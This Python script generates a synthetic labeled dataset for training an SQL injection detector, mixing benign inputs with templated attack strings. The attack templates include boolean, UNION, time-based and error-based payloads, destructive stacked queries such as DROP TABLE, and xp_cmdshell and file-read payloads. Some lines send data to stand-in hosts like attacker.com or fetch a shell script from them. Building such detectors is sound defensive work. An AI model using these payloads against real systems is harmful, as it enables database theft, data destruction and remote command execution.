"""
Synthetic Dataset Generator for SQL Injection Detection.

Generates ~40,000 labeled samples (20k injection + 20k safe)
with diverse attack types and realistic safe inputs.

Usage:
    python training/generate_dataset.py
    # Output: data/dataset.csv
"""

import csv
import random
import string
import uuid
import os
from pathlib import Path
from typing import List, Tuple

# Seed for reproducibility
random.seed(42)

PROJECT_ROOT = Path(__file__).parent.parent
OUTPUT_DIR = PROJECT_ROOT / "data"
OUTPUT_FILE = OUTPUT_DIR / "dataset.csv"


# ═══════════════════════════════════════════════════════════════════
# HELPER FUNCTIONS
# ═══════════════════════════════════════════════════════════════════

def rand_table():
    return random.choice([
        'users', 'accounts', 'admin', 'credentials', 'passwords',
        'members', 'employees', 'customers', 'orders', 'products',
        'sessions', 'tokens', 'permissions', 'roles', 'logs',
        'payments', 'transactions', 'profiles', 'settings', 'configs',
    ])


def rand_column():
    return random.choice([
        'username', 'password', 'email', 'id', 'name', 'credit_card',
        'ssn', 'phone', 'address', 'token', 'secret', 'hash',
        'salt', 'role', 'status', 'created_at', 'ip_address',
    ])


def rand_int(lo=1, hi=100):
    return random.randint(lo, hi)


def rand_str(length=5):
    return ''.join(random.choices(string.ascii_lowercase, k=length))


def rand_comment():
    return random.choice(['--', '#', '/*', '-- -', '--+', '-- ', '#!', '/**/', '--\t'])


def rand_space():
    """Random whitespace variations."""
    return random.choice([' ', '  ', '\t', ' \t '])


def rand_case(s: str) -> str:
    """Randomize case of each character."""
    return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in s)


def url_encode_partial(s: str, fraction: float = 0.3) -> str:
    """URL-encode a random fraction of characters."""
    result = []
    for ch in s:
        if random.random() < fraction and ch.isascii() and not ch.isalnum():
            result.append(f'%{ord(ch):02X}')
        else:
            result.append(ch)
    return ''.join(result)


def insert_comments(s: str) -> str:
    """Insert /**/ comments between words."""
    words = s.split()
    result = []
    for i, w in enumerate(words):
        result.append(w)
        if i < len(words) - 1 and random.random() > 0.5:
            result.append('/**/')
        else:
            result.append(' ')
    return ''.join(result).strip()


# ═══════════════════════════════════════════════════════════════════
# SQL INJECTION GENERATORS
# ═══════════════════════════════════════════════════════════════════

_PREFIX_NAMES = [
    'admin', 'user', 'test', 'guest', 'root', 'john', 'jane', 'bob',
    'alice', 'mike', 'sarah', 'david', 'emma', 'alex', 'chris',
]


def rand_prefix():
    """Random realistic prefix that might precede an injection."""
    prefixes = [
        '', '', '',  # empty is common
        str(rand_int(1, 99999)), 'admin', 'user', 'test',
        rand_str(random.randint(3, 8)),
        random.choice(_PREFIX_NAMES),
        f"id={rand_int(1, 999)}&name=",
        f"{rand_int(1, 100)}",
    ]
    return random.choice(prefixes)


def gen_boolean_based(n: int) -> List[str]:
    """Generate boolean-based injection payloads."""
    samples = set()

    while len(samples) < n:
        v = rand_str(random.randint(1, 6))
        c = rand_comment()
        nn = rand_int(1, 999)
        mm = nn  # for tautology
        prefix = rand_prefix()
        space = rand_space()
        op = random.choice(['OR', 'or', 'Or', 'oR', '||'])
        and_op = random.choice(['AND', 'and', 'And', '&&'])

        templates = [
            f"{prefix}'{space}{op}{space}'{v}'='{v}",
            f"{prefix}'{space}{op}{space}'1'='1",
            f"{prefix}'{space}{and_op}{space}'1'='1",
            f"{prefix}' {op} 1=1{c}",
            f"{prefix}' {op} {nn}={nn}{c}",
            f"{prefix}' {op} '{v}'='{v}'{c}",
            f"\"{prefix}\" {op} \"1\"=\"1",
            f"{prefix}') {op} ('1'='1",
            f"{prefix}') {op} ('{v}'='{v}",
            f"{prefix}' {op} 1=1 {op} ''='",
            f"\" {op} 1=1{c}",
            f"1 {op} 1=1",
            f"{prefix}' {op} true{c}",
            f"{prefix}' {op} 1{c}",
            f"{prefix}' {op} 1=1 LIMIT {rand_int(1,10)}{c}",
            f"{prefix}' {op} 1=1 ORDER BY {rand_int(1,10)}{c}",
            f"{prefix}' {op} 1 LIKE 1{c}",
            f"{prefix}' {op} {nn} IN ({nn}){c}",
            f"{prefix}' {op} {nn} BETWEEN {nn-1} AND {nn+1}{c}",
            f"{prefix}' {op} ''='",
            f"{prefix}'%20{op}%20'1'%3D'1",
            f"{prefix}' {op} {nn}={mm} {and_op} '{v}'='{v}'{c}",
        ]

        s = random.choice(templates)

        # Random variations
        if random.random() < 0.2:
            s = rand_case(s)
        if random.random() < 0.15:
            s = url_encode_partial(s)

        samples.add(s)

    return list(samples)[:n]


def gen_union_based(n: int) -> List[str]:
    """Generate UNION-based injection payloads."""
    samples = set()

    while len(samples) < n:
        num_cols = random.randint(1, 10)
        nulls = ','.join(['NULL'] * num_cols)
        nums = ','.join([str(i + 1) for i in range(num_cols)])
        table = rand_table()
        col1 = rand_column()
        col2 = rand_column()
        c = rand_comment()
        prefix = rand_prefix()
        union_kw = random.choice(['UNION', 'union', 'Union', 'UNION ALL', 'union all'])

        templates = [
            f"{prefix}' {union_kw} SELECT {nulls}{c}",
            f"{prefix}' {union_kw} SELECT {col1},{col2} FROM {table}{c}",
            f"{prefix}') {union_kw} SELECT {nulls}{c}",
            f"{prefix}' {union_kw} SELECT {col1},NULL FROM {table}{c}",
            f"{rand_int(-100, 0)} {union_kw} SELECT {nulls}",
            f"{prefix}' {union_kw} SELECT {nums}{c}",
            f"{prefix}' {union_kw} SELECT CONCAT({col1},0x3a,{col2}) FROM {table}{c}",
            f"{prefix}' {union_kw} SELECT GROUP_CONCAT({col1}) FROM {table}{c}",
            f"{prefix}' {union_kw} SELECT {col1} FROM information_schema.tables{c}",
            f"{prefix}' {union_kw} SELECT table_name FROM information_schema.tables WHERE table_schema=database(){c}",
            f"{prefix}' {union_kw} SELECT column_name FROM information_schema.columns WHERE table_name='{table}'{c}",
            f"{prefix}' {union_kw} SELECT {col1} FROM {table} LIMIT {rand_int(1,10)}{c}",
            f"{prefix}' {union_kw} SELECT {col1},{col2},NULL FROM {table}{c}",
        ]

        s = random.choice(templates)

        if random.random() < 0.2:
            s = rand_case(s)
        if random.random() < 0.15:
            s = insert_comments(s)
        if random.random() < 0.1:
            s = url_encode_partial(s)

        samples.add(s)

    return list(samples)[:n]


def gen_time_based(n: int) -> List[str]:
    """Generate time-based blind injection payloads."""
    samples = set()

    while len(samples) < n:
        delay = random.randint(1, 30)
        c = rand_comment()
        prefix = rand_prefix()
        bench_n = random.randint(100000, 99999999)

        templates = [
            f"{prefix}' AND SLEEP({delay}){c}",
            f"{prefix}' OR SLEEP({delay}){c}",
            f"{prefix}'; WAITFOR DELAY '0:0:{delay}'{c}",
            f"{prefix}' AND BENCHMARK({bench_n},SHA1('{rand_str(4)}')){c}",
            f"{prefix}' AND pg_sleep({delay}){c}",
            f"{prefix}') AND SLEEP({delay}){c}",
            f"{prefix}' AND IF(1=1,SLEEP({delay}),0){c}",
            f"{prefix}' OR IF(1=1,SLEEP({delay}),0){c}",
            f"{prefix}';SELECT SLEEP({delay}){c}",
            f"{prefix}' AND (SELECT SLEEP({delay})){c}",
            f"{prefix}' UNION SELECT SLEEP({delay}){c}",
            f"{rand_int(1, 999)};WAITFOR DELAY '0:0:{delay}'",
            f"{prefix}' AND IF(SUBSTRING(database(),{rand_int(1,10)},1)='{rand_str(1)}',SLEEP({delay}),0){c}",
            f"{prefix}' AND (SELECT {delay} FROM (SELECT(SLEEP({delay})))x){c}",
        ]

        s = random.choice(templates)
        if random.random() < 0.15:
            s = rand_case(s)
        samples.add(s)

    return list(samples)[:n]


def gen_stacked_queries(n: int) -> List[str]:
    """Generate stacked query injection payloads."""
    samples = set()

    while len(samples) < n:
        table = rand_table()
        table2 = rand_table()
        col = rand_column()
        col2 = rand_column()
        val = rand_str(random.randint(3, 10))
        c = rand_comment()
        prefix = rand_prefix()
        new_table = rand_str(random.randint(3, 8))

        templates = [
            f"{prefix}'; DROP TABLE {table}{c}",
            f"{prefix}'; DROP TABLE IF EXISTS {table}{c}",
            f"{prefix}'; DELETE FROM {table}{c}",
            f"{prefix}'; DELETE FROM {table} WHERE {col}='{val}'{c}",
            f"{prefix}'; DELETE FROM {table} WHERE 1=1{c}",
            f"{prefix}'; UPDATE {table} SET {col}='{val}'{c}",
            f"{prefix}'; UPDATE {table} SET {col}='{val}' WHERE {col2}={rand_int(1, 100)}{c}",
            f"{prefix}'; INSERT INTO {table} VALUES('{val}','{rand_str(5)}'){c}",
            f"{prefix}'; INSERT INTO {table}({col}) VALUES('{val}'){c}",
            f"{prefix}'; TRUNCATE TABLE {table}{c}",
            f"{prefix}'; ALTER TABLE {table} DROP COLUMN {col}{c}",
            f"{prefix}'; ALTER TABLE {table} ADD {rand_str(4)} VARCHAR(255){c}",
            f"{prefix}'; CREATE TABLE {new_table}(id INT, {col} VARCHAR(255)){c}",
            f"{prefix}'; SHUTDOWN{c}",
            f"{rand_int(1, 999)}; DROP TABLE {table}",
            f"{prefix}'; INSERT INTO {table}({col}) SELECT {col2} FROM {table2}{c}",
            f"{prefix}'; GRANT ALL ON {table} TO '{rand_str(5)}'{c}",
            f"{prefix}'; REVOKE ALL ON {table} FROM '{rand_str(5)}'{c}",
            f"{prefix}'; EXEC sp_executesql N'SELECT * FROM {table}'{c}",
        ]

        s = random.choice(templates)
        if random.random() < 0.15:
            s = rand_case(s)
        if random.random() < 0.1:
            s = url_encode_partial(s)
        samples.add(s)

    return list(samples)[:n]


def gen_error_based(n: int) -> List[str]:
    """Generate error-based injection payloads."""
    samples = set()

    funcs = [
        'version()', 'database()', 'user()', '@@version',
        'current_user()', 'schema()', '@@hostname', '@@datadir',
        '@@basedir', '@@global.version_compile_os',
        f"(SELECT {rand_column()} FROM {rand_table()} LIMIT 1)",
    ]

    while len(samples) < n:
        c = rand_comment()
        func = random.choice(funcs)
        prefix = rand_prefix()
        hex_delim = random.choice(['0x7e', '0x3a', '0x2d', '0x7c'])

        templates = [
            f"{prefix}' AND EXTRACTVALUE(1,CONCAT({hex_delim},{func})){c}",
            f"{prefix}' AND UPDATEXML(1,CONCAT({hex_delim},{func}),1){c}",
            f"{prefix}' AND EXP(~(SELECT * FROM (SELECT {func})x)){c}",
            f"{prefix}' AND JSON_KEYS((SELECT CONVERT((SELECT {func}) USING utf8))){c}",
            f"{prefix}' AND GTID_SUBSET(CONCAT({hex_delim},{func}),1){c}",
            f"{prefix}' AND ROW(1,1)>(SELECT COUNT(*),CONCAT({func},FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x){c}",
            f"{prefix}' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT({func},FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a){c}",
            f"{rand_int(1, 999)} AND EXTRACTVALUE(1,CONCAT({hex_delim},{func})){c}",
            f"{prefix}' OR EXTRACTVALUE(1,CONCAT({hex_delim},{func})){c}",
            f"{prefix}') AND UPDATEXML(1,CONCAT({hex_delim},{func}),1){c}",
        ]

        s = random.choice(templates)
        if random.random() < 0.15:
            s = rand_case(s)
        samples.add(s)

    return list(samples)[:n]


def gen_encoded_obfuscated(n: int) -> List[str]:
    """Generate encoded and obfuscated payloads."""
    samples = []

    # Base payloads to obfuscate
    base_payloads = [
        "' OR '1'='1",
        "' UNION SELECT NULL--",
        "' AND SLEEP(5)--",
        "'; DROP TABLE users--",
        "' OR 1=1--",
        "admin'--",
        "' UNION SELECT username,password FROM users--",
    ]

    for _ in range(n):
        base = random.choice(base_payloads)
        method = random.choice(['url', 'double_url', 'comment', 'case', 'mixed', 'hex_encode'])

        if method == 'url':
            s = url_encode_partial(base, fraction=0.5)
        elif method == 'double_url':
            s = url_encode_partial(base, fraction=0.4)
            s = s.replace('%', '%25')  # Double encode
        elif method == 'comment':
            s = insert_comments(base)
        elif method == 'case':
            s = rand_case(base)
        elif method == 'mixed':
            s = rand_case(insert_comments(base))
            if random.random() < 0.3:
                s = url_encode_partial(s, fraction=0.2)
        elif method == 'hex_encode':
            # Hex-encode some string literals
            s = base
            for lit in ["'1'", "'a'", "users"]:
                if lit in s:
                    hex_val = '0x' + lit.strip("'").encode().hex()
                    s = s.replace(lit, hex_val, 1)

        samples.append(s)

    return samples


def gen_os_command(n: int) -> List[str]:
    """Generate OS command injection payloads."""
    samples = set()

    cmds = [
        'dir', 'ls', 'ls -la', 'whoami', 'cat /etc/passwd', 'net user',
        'ipconfig', 'ifconfig', 'id', 'uname -a', 'type C:\\boot.ini',
        'ping attacker.com', 'nslookup attacker.com', 'curl http://attacker.com',
        'wget http://attacker.com/shell.sh', 'cat /etc/shadow', 'ps aux',
    ]
    paths = [
        '/etc/passwd', '/etc/shadow', '/etc/hosts', '/var/log/auth.log',
        '/proc/self/environ', '/root/.ssh/id_rsa', '/tmp/dump.txt',
        'C:\\Windows\\System32\\config\\SAM', 'C:\\boot.ini',
    ]
    domains = [
        'attacker.com', 'evil.com', f'{rand_str(5)}.com',
        f'{rand_str(6)}.net', f'{rand_str(4)}.xyz',
    ]

    while len(samples) < n:
        c = rand_comment()
        cmd = random.choice(cmds)
        path = random.choice(paths)
        domain = random.choice(domains)
        prefix = rand_prefix()
        col = rand_column()

        templates = [
            f"{prefix}'; EXEC xp_cmdshell('{cmd}'){c}",
            f"{prefix}'; EXEC master..xp_cmdshell '{cmd}'{c}",
            f"{prefix}' AND LOAD_FILE('{path}'){c}",
            f"{prefix}' INTO OUTFILE '{path}'{c}",
            f"{prefix}' INTO DUMPFILE '/tmp/{rand_str(5)}.bin'{c}",
            f"{prefix}'; EXEC xp_dirtree '\\\\{domain}\\share'{c}",
            f"{prefix}' UNION SELECT LOAD_FILE('{path}'){c}",
            f"{prefix}'; sp_configure 'xp_cmdshell',1; RECONFIGURE{c}",
            f"{prefix}' AND UTL_HTTP.REQUEST('http://{domain}/'||{col}){c}",
            f"{prefix}' AND UTL_INADDR.GET_HOST_ADDRESS('{domain}'){c}",
            f"{prefix}' UNION SELECT LOAD_FILE(CONCAT('/tmp/',{col})){c}",
        ]

        s = random.choice(templates)
        if random.random() < 0.1:
            s = rand_case(s)
        samples.add(s)

    return list(samples)[:n]


def gen_comment_truncation(n: int) -> List[str]:
    """Generate comment truncation payloads."""
    samples = set()

    usernames = [
        'admin', 'root', 'administrator', 'sa', 'dba', 'test', 'user',
        'sysadmin', 'operator', 'guest', 'support', 'manager', 'backup',
        rand_str(random.randint(4, 8)),
    ]

    while len(samples) < n:
        user = random.choice(usernames)
        c = rand_comment()
        extra = rand_str(random.randint(0, 5))

        templates = [
            f"{user}'{c}",
            f"{user}' {c}",
            f"{user}'/*{extra}*/",
            f"{user}' OR ''='",
            f"' {c}",
            f"') {c}",
            f"\") {c}",
            f"{user}' AND 1=1{c}",
            f"{user}' AND '{extra}'='{extra}",
            f"{user}{extra}'{c}",
            f"'{c} {extra}",
            f"{user}'/**/--",
        ]

        s = random.choice(templates)
        samples.add(s)

    return list(samples)[:n]


# ═══════════════════════════════════════════════════════════════════
# SAFE INPUT GENERATORS
# ═══════════════════════════════════════════════════════════════════

FIRST_NAMES = [
    "James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael",
    "Linda", "William", "Elizabeth", "David", "Barbara", "Richard", "Susan",
    "Joseph", "Jessica", "Thomas", "Sarah", "Charles", "Karen", "Christopher",
    "Lisa", "Daniel", "Nancy", "Matthew", "Betty", "Anthony", "Margaret",
    "Mark", "Sandra", "Donald", "Ashley", "Steven", "Dorothy", "Paul", "Kimberly",
    "Andrew", "Emily", "Joshua", "Donna", "Kenneth", "Michelle", "Kevin", "Carol",
    "Brian", "Amanda", "George", "Melissa", "Timothy", "Deborah",
]

LAST_NAMES = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller",
    "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez",
    "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin",
    "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark",
    "Ramirez", "Lewis", "Robinson", "Walker", "Young", "Allen", "King",
    "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores",
]

APOSTROPHE_NAMES = [
    "O'Brien", "O'Connor", "O'Neil", "O'Reilly", "O'Sullivan", "O'Malley",
    "O'Donnell", "O'Leary", "O'Hara", "D'Angelo", "D'Arcy", "D'Cruz",
    "McDonald's", "L'Oreal", "it's", "don't", "won't", "can't", "shouldn't",
    "they're", "we're", "you're", "he's", "she's", "children's", "women's",
    "rock 'n' roll", "ma'am", "o'clock", "ne'er-do-well",
]

DOMAINS = [
    "gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "example.com",
    "company.org", "university.edu", "business.net", "mail.ru", "protonmail.com",
]

SENTENCES_WITH_SQL_WORDS = [
    "Please select an option from the dropdown",
    "Select all that apply to your situation",
    "Drop me a line when you get a chance",
    "Please drop off the package at reception",
    "Update your profile information",
    "We will update you on the status",
    "Delete old files from the folder",
    "Please delete my account",
    "Join our union for better benefits",
    "The European Union announced new regulations",
    "Insert coin to play the game",
    "Insert your card into the reader",
    "The table is ready for dinner",
    "Check the table of contents",
    "Where is the nearest hospital",
    "Where do you want to go",
    "Let me order some food",
    "Order by name or by date",
    "Select the best option available",
    "We need to drop this topic",
    "The group will meet on Tuesday",
    "Having a great time on vacation",
    "Set your preferences in settings",
    "Create a new document",
    "Alter the recipe as needed",
    "Grant me permission to enter",
    "Execute the plan as discussed",
    "The values are within normal range",
    "I like the combination of colors",
    "We need to select candidates for the role",
    "The union representative will attend",
    "Please insert your feedback below",
    "You can delete cookies from your browser",
    "Drop by anytime you're free",
    "The database of knowledge is vast",
    "Null and void agreement",
    "There is no null hypothesis here",
    "Or maybe we should try something different",
    "And then we went to the store",
    "Not all heroes wear capes",
    "Is this the right approach",
    "Between you and me",
    "Like a rolling stone",
    "From what I understand",
    "Having said that let us proceed",
    "In my humble opinion",
]

PATH_TEMPLATES = [
    "/api/v1/users/{id}",
    "/api/v2/products/{id}",
    "/dashboard/settings",
    "/auth/login",
    "/auth/register",
    "/api/search?q={query}",
    "https://example.com/page/{id}",
    "https://cdn.example.com/images/{name}.jpg",
    "/uploads/{name}.pdf",
    "/files/{uuid}",
    "C:\\Users\\{name}\\Documents",
    "/home/{name}/projects",
]


def gen_safe_names(n: int) -> List[str]:
    """Generate realistic person names."""
    samples = []
    for _ in range(n):
        kind = random.choice(['full', 'first', 'last', 'apostrophe', 'username'])
        if kind == 'full':
            s = f"{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}"
        elif kind == 'first':
            s = random.choice(FIRST_NAMES)
        elif kind == 'last':
            s = random.choice(LAST_NAMES)
        elif kind == 'apostrophe':
            s = random.choice(APOSTROPHE_NAMES)
        else:
            fn = random.choice(FIRST_NAMES).lower()
            ln = random.choice(LAST_NAMES).lower()
            s = random.choice([
                f"{fn}_{ln}", f"{fn}.{ln}", f"{fn}{rand_int(1, 99)}",
                f"{fn[0]}{ln}", f"{fn}{ln[:3]}",
            ])
        samples.append(s)
    return samples


def gen_safe_emails(n: int) -> List[str]:
    """Generate realistic email addresses."""
    samples = []
    for _ in range(n):
        fn = random.choice(FIRST_NAMES).lower()
        ln = random.choice(LAST_NAMES).lower()
        domain = random.choice(DOMAINS)
        fmt = random.choice([
            f"{fn}.{ln}@{domain}",
            f"{fn}{ln}@{domain}",
            f"{fn}_{ln}@{domain}",
            f"{fn[0]}{ln}@{domain}",
            f"{fn}{rand_int(1, 999)}@{domain}",
        ])
        samples.append(fmt)
    return samples


def gen_safe_ids(n: int) -> List[str]:
    """Generate numeric IDs, UUIDs, dates, IPs, phone numbers."""
    samples = []
    for _ in range(n):
        kind = random.choice(['int', 'uuid', 'date', 'ip', 'phone', 'hex'])
        if kind == 'int':
            s = str(rand_int(1, 999999))
        elif kind == 'uuid':
            s = str(uuid.uuid4())
        elif kind == 'date':
            y = random.randint(2020, 2026)
            m = random.randint(1, 12)
            d = random.randint(1, 28)
            s = f"{y}-{m:02d}-{d:02d}"
        elif kind == 'ip':
            s = f"{rand_int(1,255)}.{rand_int(0,255)}.{rand_int(0,255)}.{rand_int(1,255)}"
        elif kind == 'phone':
            s = f"+1-{rand_int(200,999)}-{rand_int(100,999)}-{rand_int(1000,9999)}"
        else:
            s = uuid.uuid4().hex[:random.randint(8, 32)]
        samples.append(s)
    return samples


def gen_safe_sentences(n: int) -> List[str]:
    """Generate natural language sentences containing SQL keywords."""
    samples = []
    for _ in range(n):
        s = random.choice(SENTENCES_WITH_SQL_WORDS)
        # Add slight variations
        if random.random() < 0.3:
            s = s.lower()
        if random.random() < 0.2:
            s = s.upper()
        if random.random() < 0.3:
            s = s + random.choice(['.', '!', '?', '...', ''])
        samples.append(s)
    return samples


def gen_safe_json(n: int) -> List[str]:
    """Generate JSON-like strings and API tokens."""
    samples = []
    for _ in range(n):
        kind = random.choice(['json', 'token', 'base64', 'key_value'])
        if kind == 'json':
            key = random.choice(['name', 'email', 'status', 'count', 'type', 'message'])
            val = random.choice(['active', 'pending', 'hello', '42', 'true', 'null'])
            s = f'{{""{key}"": ""{val}""}}'
        elif kind == 'token':
            prefix = random.choice(['sk-', 'pk-', 'Bearer ', 'token_', 'api_'])
            s = prefix + ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(20, 40)))
        elif kind == 'base64':
            s = ''.join(random.choices(string.ascii_letters + string.digits + '+/', k=random.randint(16, 64))) + '=='
        else:
            k = random.choice(['user_id', 'session', 'ref', 'lang', 'theme'])
            v = random.choice(['en', 'dark', 'default', str(rand_int(1, 1000))])
            s = f"{k}={v}"
        samples.append(s)
    return samples


def gen_safe_paths(n: int) -> List[str]:
    """Generate URL paths and file paths."""
    samples = []
    for _ in range(n):
        t = random.choice(PATH_TEMPLATES)
        s = t.format(
            id=rand_int(1, 99999),
            query=rand_str(random.randint(3, 12)),
            name=rand_str(random.randint(4, 10)),
            uuid=str(uuid.uuid4()),
        )
        samples.append(s)
    return samples


def gen_safe_quotes(n: int) -> List[str]:
    """Generate strings with quotes that are NOT SQL injection."""
    samples = []

    templates = [
        "it's a beautiful day",
        "I'm going home",
        "they're coming tomorrow",
        "she said \"hello\"",
        "the file 'readme.txt' is missing",
        "use the 'help' command",
        "type 'yes' to confirm",
        "title: 'My First Post'",
        "name: \"John Doe\"",
        "error: 'file not found'",
        "value='checked'",
        "class='active'",
        "data-id='123'",
        "alt='logo image'",
        "placeholder='Enter your name'",
        "the dog's bone",
        "mother's day",
        "father's car",
        "today's special",
        "world's best",
        "boss's office",
        "1 + 1 = 2",
        "x = y + z",
        "a != b",
        "count >= 10",
        "price <= 50.00",
        "if (x > 0) { return true; }",
        "print('hello world')",
        "console.log('test')",
        "SELECT is a reserved word in SQL",
    ]

    for _ in range(n):
        s = random.choice(templates)
        if random.random() < 0.3:
            # Add random prefix/suffix
            s = rand_str(random.randint(2, 5)) + ' ' + s
        if random.random() < 0.2:
            s = s + ' ' + rand_str(random.randint(2, 5))
        samples.append(s)
    return samples


def gen_safe_edge_cases(n: int) -> List[str]:
    """Generate edge case inputs: short strings, unicode, HTML, etc."""
    samples = []

    for _ in range(n):
        kind = random.choice([
            'single_char', 'short', 'numeric', 'unicode', 'html',
            'empty_like', 'special_chars', 'long_word',
        ])

        if kind == 'single_char':
            s = random.choice(list(string.printable.strip()))
        elif kind == 'short':
            s = rand_str(random.randint(1, 4))
        elif kind == 'numeric':
            s = str(random.uniform(-1000, 1000))
        elif kind == 'unicode':
            names = ['Muller', 'Bjork', 'Renee', 'Zoe', 'Noel', 'Jose', 'Cafe']
            s = random.choice(names)
        elif kind == 'html':
            tag = random.choice(['div', 'span', 'p', 'h1', 'a', 'img', 'br'])
            s = f"<{tag}>Hello World</{tag}>"
        elif kind == 'empty_like':
            s = random.choice(['', ' ', '  ', '\t', '\n', 'N/A', 'null', 'none', 'undefined', '-'])
        elif kind == 'special_chars':
            s = ''.join(random.choices('!@#$%^&*()_+-=[]{}|;:,.<>?/', k=random.randint(3, 10)))
        else:
            s = rand_str(random.randint(15, 40))

        samples.append(s)
    return samples


# ═══════════════════════════════════════════════════════════════════
# MAIN GENERATION
# ═══════════════════════════════════════════════════════════════════

def generate_dataset() -> Tuple[List[str], List[int]]:
    """Generate the full dataset."""

    texts = []
    labels = []

    # === SQL INJECTION SAMPLES (20,000) ===
    print("Generating SQL injection samples...")

    sqli_generators = [
        (gen_boolean_based, 4000, "Boolean-based"),
        (gen_union_based, 3000, "UNION-based"),
        (gen_time_based, 2500, "Time-based"),
        (gen_stacked_queries, 3000, "Stacked queries"),
        (gen_error_based, 1500, "Error-based"),
        (gen_encoded_obfuscated, 3000, "Encoded/obfuscated"),
        (gen_os_command, 1500, "OS command"),
        (gen_comment_truncation, 1500, "Comment truncation"),
    ]

    for gen_fn, count, name in sqli_generators:
        samples = gen_fn(count)
        texts.extend(samples)
        labels.extend([1] * len(samples))
        print(f"  {name}: {len(samples)} samples")

    # === SAFE SAMPLES (20,000) ===
    print("Generating safe samples...")

    safe_generators = [
        (gen_safe_names, 3000, "Names"),
        (gen_safe_emails, 2000, "Emails"),
        (gen_safe_ids, 2000, "IDs/UUIDs/Dates"),
        (gen_safe_sentences, 3000, "Sentences with SQL words"),
        (gen_safe_json, 2000, "JSON/API tokens"),
        (gen_safe_paths, 2000, "URLs/Paths"),
        (gen_safe_quotes, 2000, "Strings with quotes"),
        (gen_safe_edge_cases, 4000, "Edge cases"),
    ]

    for gen_fn, count, name in safe_generators:
        samples = gen_fn(count)
        texts.extend(samples)
        labels.extend([0] * len(samples))
        print(f"  {name}: {len(samples)} samples")

    return texts, labels


def main():
    print("=" * 60)
    print("SQL Injection Dataset Generator")
    print("=" * 60)

    texts, labels = generate_dataset()

    # Deduplicate
    seen = set()
    unique_texts = []
    unique_labels = []
    for t, l in zip(texts, labels):
        if t not in seen:
            seen.add(t)
            unique_texts.append(t)
            unique_labels.append(l)

    print(f"\nTotal before dedup: {len(texts)}")
    print(f"Total after dedup:  {len(unique_texts)}")
    print(f"Duplicates removed: {len(texts) - len(unique_texts)}")

    # Shuffle
    combined = list(zip(unique_texts, unique_labels))
    random.shuffle(combined)
    unique_texts, unique_labels = zip(*combined)

    # Count labels
    n_sqli = sum(1 for l in unique_labels if l == 1)
    n_safe = sum(1 for l in unique_labels if l == 0)
    print(f"\nInjection samples: {n_sqli}")
    print(f"Safe samples:      {n_safe}")
    print(f"Balance ratio:     {n_sqli / (n_sqli + n_safe):.2%} injection")

    # Write CSV
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

    with open(OUTPUT_FILE, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(['text', 'label'])
        for t, l in zip(unique_texts, unique_labels):
            writer.writerow([t, l])

    print(f"\nDataset saved to: {OUTPUT_FILE}")
    print(f"Total samples:    {len(unique_texts)}")
    print("=" * 60)


if __name__ == '__main__':
    main()
